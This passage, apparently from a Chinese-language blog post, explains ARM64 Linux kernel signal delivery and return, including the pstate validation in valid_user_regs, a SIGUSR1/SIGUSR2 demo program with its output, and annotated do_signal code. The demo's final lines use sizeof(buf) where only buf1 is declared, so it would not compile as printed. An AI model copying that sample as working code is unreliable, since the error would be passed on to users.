class="comment">/* 4K reserved for FP/SIMD state and future expansion */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>用户态跳转到/修改任何用户态数据均不会有权限问题，<strong>其中唯一的问题就是内核在信号返回时会从用户态读取 pstate 并恢复到内核的 CPSR_EL1</strong>；pstate 中记录了一些需要恢复的如比较结果，是否溢出等，但同时也记录了一些安全相关的如当前异常级别等 bit 位，故如果不加检查的直接从用户态恢复此值则攻击者可以轻易利用信号处理来提升异常级别（如用户态由 EL0=&gt;EL1）， <strong>内核处理的方式则是恢复用户态上下文之前添加了一个检查函数 valid_user_regs，以确保 pstate 的正确性</strong>，代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">valid_user_regs</span><span class="params">(struct user_pt_regs *regs, struct task_struct *task)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">user_regs_reset_single_step</span>(regs, task);       <span class="comment">/* 若需要则重置单步调试 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">is_compat_thread</span>(<span class="built_in">task_thread_info</span>(task)))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">valid_compat_regs</span>(regs);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">valid_native_regs</span>(regs);                <span class="comment">/* pstate 必须设置为 EL0, 开启所有中断，aarch64 模式才有效 */</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">valid_native_regs</span><span class="params">(struct user_pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         </span><br><span class="line">    regs-&gt;pstate &amp;= ~SPSR_EL1_AARCH64_RES0_BITS;       <span class="comment">/* pstate 中reserved bit 直接置零 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       * user_mode 要求 pstate 最后 4bit 为必须为 0x0（也就是返回到用户态必须是 EL0）</span></span><br><span class="line"><span class="comment">       * 64 位不能返回到 aarch32；</span></span><br><span class="line"><span class="comment">       * 且当前的异常掩码必须全部置零（开中断）</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">user_mode</span>(regs) &amp;&amp; !(regs-&gt;pstate &amp; PSR_MODE32_BIT) &amp;&amp;</span><br><span class="line">        (regs-&gt;pstate &amp; PSR_D_BIT) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (regs-&gt;pstate &amp; PSR_A_BIT) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (regs-&gt;pstate &amp; PSR_I_BIT) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (regs-&gt;pstate &amp; PSR_F_BIT) == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Force PSR to a valid 64-bit EL0t */</span></span><br><span class="line">    regs-&gt;pstate &amp;= PSR_N_BIT | PSR_Z_BIT | PSR_C_BIT | PSR_V_BIT;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3、信号处理举例"><a href="#3、信号处理举例" class="headerlink" title="3、信号处理举例"></a>3、信号处理举例</h3><p>测试代码:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 此代码针对 aarch64 平台, 其他平台由于 ucontext 结构体定义不同编译不通过 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ucontext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">siguser2_handler</span><span class="params">(<span class="keyword">int</span> signo, <span class="keyword">siginfo_t</span> *info, <span class="keyword">void</span> *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> *<span class="title">uc</span> =</span> ctx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *fp = __builtin_frame_address(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *lr = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+][siguser2]: current fp:%p, lr:%p\n&quot;</span>, fp, lr);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+][siguser2]: ucontext:%p, size:%x\n&quot;</span>, uc, <span class="built_in"><span class="keyword">sizeof</span></span>(struct ucontext));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+][siguser2]: prev context: pc:%p, sp:%p, lr:%p\n&quot;</span>, </span><br><span class="line">            uc-&gt;uc_mcontext.pc, uc-&gt;uc_mcontext.sp, uc-&gt;uc_mcontext.regs[<span class="number">30</span>]);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">siguser1_handler</span><span class="params">(<span class="keyword">int</span> signo, <span class="keyword">siginfo_t</span> *info, <span class="keyword">void</span> *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> *<span class="title">uc</span> =</span> ctx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *fp = __builtin_frame_address(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *lr = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+][siguser1]: current fp:%p, lr:%p\n&quot;</span>, fp, lr);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+][siguser1]: ucontext:%p, size:%x\n&quot;</span>, uc, <span class="built_in"><span class="keyword">sizeof</span></span>(struct ucontext));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+][siguser1]: prev context: pc:%p, sp:%p, lr:%p\n&quot;</span>, </span><br><span class="line">            uc-&gt;uc_mcontext.pc, uc-&gt;uc_mcontext.sp, uc-&gt;uc_mcontext.regs[<span class="number">30</span>]);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">act</span>;</span></span><br><span class="line">    <span class="keyword">sigset_t</span> set, oldset;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] current pid:%d, setting siguser1_handler:%p, siguser2_handler:%p ...\n&quot;</span>, </span><br><span class="line">            <span class="built_in">getpid</span>(), siguser1_handler, siguser2_handler);</span><br><span class="line">     </span><br><span class="line">    act.sa_sigaction = siguser1_handler;             </span><br><span class="line">    act.sa_flags = SA_SIGINFO;</span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;act.sa_mask);</span><br><span class="line">    <span class="built_in">sigaction</span>(SIGUSR1, &amp;act, <span class="literal">NULL</span>);</span><br><span class="line">    act.sa_sigaction = siguser2_handler;</span><br><span class="line">    <span class="built_in">sigaction</span>(SIGUSR2, &amp;act, <span class="literal">NULL</span>);                               <span class="comment">/* 设置 SIGUSER1/SIGUSER2 的 handler */</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] setting mask for SIGUSR1/2 ...\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;set);</span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;oldset);</span><br><span class="line">    <span class="built_in">sigaddset</span>(&amp;set, SIGUSR1);</span><br><span class="line">    <span class="built_in">sigaddset</span>(&amp;set, SIGUSR2);</span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;set, &amp;oldset);                  <span class="comment">/* 先 block SIGUSER1/SIGUSER2 信号的处理 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] sending signal SIGUSR1 ...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">kill</span>(<span class="built_in">getpid</span>(), SIGUSR1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] sending signal SIGUSR2 ...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">kill</span>(<span class="built_in">getpid</span>(), SIGUSR2);                                   <span class="comment">/* 向当前进程发送 SIGUSER1/SIGUSER2 信号, 此时线程同时拥有两个需要执行 handler 的信号 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] unmask SIGUSR1/2 ...\n&quot;</span>);</span><br><span class="line">                                                                <span class="comment">/* unblock SIGUSER1/SIGUSER2 信号的处理 *，此系统调用返回时处理线程的两个信号 */</span></span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;oldset, <span class="literal">NULL</span>);                  <span class="comment">/* 此时会先调用 SIGUSER2 信号处理函数, 再调用 SIGUSER1 信号处理函数，然后再返回 main 函数 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> buf1[] = <span class="string">&quot;[+] runing in main\n&quot;</span>;</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, buf1, <span class="built_in"><span class="keyword">sizeof</span></span>(buf));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  输出结果:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/ # ./main                                                                                                                 [4/7606]</span><br><span class="line">[+] current pid:112, setting siguser1_handler:0x400838, siguser2_handler:0x4007ac ...</span><br><span class="line">[+] setting mask for SIGUSR1/2 ...</span><br><span class="line">[+] sending signal SIGUSR1 ...</span><br><span class="line">[+] sending signal SIGUSR2 ...</span><br><span class="line">[+] unmask SIGUSR1/2 ...</span><br><span class="line">[+][siguser2]: current fp:0xffffc46aac60, lr:0xffff9c2b6888                                              ## siguser2返回地址为 sys_rt_sigreturn</span><br><span class="line">[+][siguser2]: ucontext:0xffffc46aad30, size:11d0</span><br><span class="line">[+][siguser2]: prev context: pc:0x400838, sp:0xffffc46abf10, lr:0xffff9c2b6888     ## siguser2上一个栈帧pc为siguser1_handler,其一句都尚未执行</span><br><span class="line">                                                                                                                                                                    ## siguser1的返回地址也是 sys_rt_sigreturn</span><br><span class="line">[+][siguser1]: current fp:0xffffc46abec0, lr:0xffff9c2b6888                                              ## siguser1的返回地址为 sys_rt_sigreturn(同上)</span><br><span class="line">[+][siguser1]: ucontext:0xffffc46abf90, size:11d0</span><br><span class="line">[+][siguser1]: prev context: pc:0x413b8c, sp:0xffffc46ad170, lr:0x4056cc                   ## siguser1上一个栈帧为系统调用的下一条指令(__pthread_sigmask中svc的下一条指令)</span><br><span class="line">                                                                                                                                                                  ## siguser1上一个栈帧的返回地址即为__pthread_sigmask的返回地址(__sigprocmask函数中的地址)</span><br><span class="line">[+] runing in main</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 进程映射</span></span></span><br><span class="line">00400000-0047a000 r-xp 00000000 00:02 5                                  /main</span><br><span class="line">0048a000-0048b000 r--p 0007a000 00:02 5                                  /main</span><br><span class="line">0048b000-0048d000 rw-p 0007b000 00:02 5                                  /main</span><br><span class="line">0048d000-00496000 rw-p 00000000 00:00 0</span><br><span class="line">25b2e000-25b50000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">ffff9c2b4000-ffff9c2b6000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">ffff9c2b6000-ffff9c2b7000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffc468d000-ffffc46ae000 rw-p 00000000 00:00 0                          [stack]</span><br></pre></td></tr></table></figure>

<p>  整个信号处理的代码执行流程如下图所示:</p>
<p><img src="./490870_GP85QUMB8JX887Z.jpg"></p>
<h2 id="4-2-EL0-异常返回前的中断检查与处理"><a href="#4-2-EL0-异常返回前的中断检查与处理" class="headerlink" title="4.2 EL0 异常返回前的中断检查与处理"></a>4.2 EL0 异常返回前的中断检查与处理</h2><p>EL0 中不论是同步/异步异常，最终均会调用函数 exit_to_user_mode 返回用户态，此函数中负责检查当前线程是否有需要处理的信号，定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">exit_to_user_mode</span><span class="params">(struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">prepare_exit_to_user_mode</span>(regs);    <span class="comment">/* 关中断, 检查返回到用户态之前是否有未完成的工作 */</span></span><br><span class="line">    <span class="built_in">mte_check_tfsr_exit</span>();</span><br><span class="line">    __exit_to_user_mode();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">prepare_exit_to_user_mode</span><span class="params">(struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">local_daif_mask</span>();   <span class="comment">/* 关中断 */</span></span><br><span class="line">     </span><br><span class="line">    flags = <span class="built_in">READ_ONCE</span>(<span class="built_in">current_thread_info</span>()-&gt;flags);   <span class="comment">/* 获取当前线程的 flag，检查是否有等待处理的工作 */</span></span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">unlikely</span>(flags &amp; _TIF_WORK_MASK))                <span class="comment">/* 如果有未完成的工作，则调用 do_nitify_resume 处理 */</span></span><br><span class="line">        <span class="built_in">do_notify_resume</span>(regs, flags);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   do_notify_resume 函数用来处理线程返回前被通知的未完成的工作，此函数直到处理完所有工作后才返回, 包括进程调度，信号处理等。</span></span><br><span class="line"><span class="comment">   这里需要注意的是，若当前线程中有多个信号需要处理，那么 do_notify_resume 会为每个信号都调用 do_signal 函数，直到所有信号处理后才返回。故在用户态角度其在执行某个信号处理函数时可能发现栈帧还堆叠着多个其他待执行的信号处理函数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_notify_resume</span><span class="params">(struct pt_regs *regs, <span class="keyword">unsigned</span> <span class="keyword">long</span> thread_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">do</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (thread_flags &amp; _TIF_NEED_RESCHED) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">local_daif_restore</span>(DAIF_PROCCTX_NOIRQ);                 <span class="comment">/* 如果是需要调度，则先关中断 */</span></span><br><span class="line">            <span class="built_in">schedule</span>();</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">local_daif_restore</span>(DAIF_PROCCTX);                       <span class="comment">/* 非调度则开中断即可 */</span></span><br><span class="line">            .......</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (thread_flags &amp; (_TIF_SIGPENDING | _TIF_NOTIFY_SIGNAL)) <span class="comment">/* do_signal 函数一次处理一个信号, 系统调用的restart也在这里处理 */</span></span><br><span class="line">                <span class="built_in">do_signal</span>(regs);</span><br><span class="line">            .......</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">local_daif_mask</span>();                                          <span class="comment">/* 关中断 */</span></span><br><span class="line">        thread_flags = <span class="built_in">READ_ONCE</span>(<span class="built_in">current_thread_info</span>()-&gt;flags);        <span class="comment">/* 再次检查是否还有未完成的工作 */</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (thread_flags &amp; _TIF_WORK_MASK);                        <span class="comment">/* 如果还有未完成工作，则循环处理 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <strong>do_signal</strong> 是信号处理的入口，此函数一次处理一个信号，其定义如下:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   此函数只在内核返回用户态时被调用，regs 是内核栈上的指针。在 EL0 异常发生时，异常入口（keren_ventry/kernel_entry）会将用户态当前寄存器状态保存到此 regs 中，同时异常返回时此 regs 会重新赋值给用户态运行环境，即此 regs 的修改会导致用户态控制流等变化。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_signal</span><span class="params">(struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> continue_addr = <span class="number">0</span>, restart_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ksignal</span> <span class="title">ksig</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">bool</span> syscall = <span class="built_in">in_syscall</span>(regs);     <span class="comment">/* 根据 pt_regs-&gt;syscallno 判断当前用户态是否是通过系统调用进入的异常 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 系统调用返回的 ERESTART* 系列返回值是需要在这里处理的 */</span></span><br><span class="line">    <span class="keyword">if</span> (syscall)     <span class="comment">/* 对于系统调用，则需要检查其返回值（R0）是否代表此系统调用要重新执行，若是则修正 pc */</span></span><br><span class="line">    &#123;                           </span><br><span class="line">        continue_addr = regs-&gt;pc;</span><br><span class="line">        restart_addr = continue_addr - (<span class="built_in">compat_thumb_mode</span>(regs) ? <span class="number">2</span> : <span class="number">4</span>);</span><br><span class="line">         </span><br><span class="line">        retval = regs-&gt;regs[<span class="number">0</span>];                <span class="comment">/* 获取 syscall 返回值，系统调用的返回值在 invoke_syscall 的最终已经放到 regs-&gt;regs[0] 中了 */</span></span><br><span class="line">        forget_syscall(regs);               <span class="comment">/* Avoid additional syscall restarting via ret_to_user. */</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           系统调用时若返回类似 ERESTARTSYS 则都需要先为此线程设置信号, 以确保可以走到此流程</span></span><br><span class="line"><span class="comment">           此时需要里需要恢复进入 syscall 之前的 x0 以供 restart 使用, 并同时重置 pc 为 restart 之前的那一条指令。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (retval) </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> -ERESTARTNOHAND:</span><br><span class="line">        <span class="keyword">case</span> -ERESTARTSYS:</span><br><span class="line">        <span class="keyword">case</span> -ERESTARTNOINTR:</span><br><span class="line">        <span class="keyword">case</span> -ERESTART_RESTARTBLOCK:</span><br><span class="line">            regs-&gt;regs[<span class="number">0</span>] = regs-&gt;orig_x0;</span><br><span class="line">            regs-&gt;pc = restart_addr;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">/* 从线程的 pending/shared_pending 队列中查找信号，对于 SIG_DFL 的直接处理掉，SIG_IGN 的信号直接忽略，</span></span><br><span class="line"><span class="comment">       若发现一个信号需要执行 handler 则立即返回，不再处理剩余信号。</span></span><br><span class="line"><span class="comment">       此函数返回 true 则代表找到一个要执行的 handler，返回 false 代表所有信号均处理完毕，没有需要执行的 handler。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">get_signal</span>(&amp;ksig)) </span><br><span class="line">    &#123;     </span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">/* 若发现一个信号需要执行信号处理函数，则调用此函数：</span></span><br><span class="line"><span class="comment">           * 将当前用户态上下文保存到用户态栈/用户态信号栈</span></span><br><span class="line"><span class="comment">           * 将用户态上下文设置为信号处理（pc=handler/sp=sp+x; lr=__kernel_rt_sigreturn ...）</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="built_in">handle_signal</span>(&amp;ksig, regs);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <strong>do_signal=&gt;get_signal</strong> 负责从信号队列中获取一个信号，其定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  此函数先从线程私有队列中查找信号，没有则从线程组共享信号队列中查找信号：</span></span><br><span class="line"><span class="comment">  * 若一个信号调用默认处理函数，则此函数内部会直接将其处理掉。</span></span><br><span class="line"><span class="comment">  * 若一个信号指定要被忽略，则此函数会直接删除并忽略此信号。</span></span><br><span class="line"><span class="comment">  * 若一个信号指定了 handler，则此函数立即返回，不再处理其余信号。</span></span><br><span class="line"><span class="comment">  需要注意的是此函数会忽略当前线程 block 的信号（current-&gt;blocked）</span></span><br><span class="line"><span 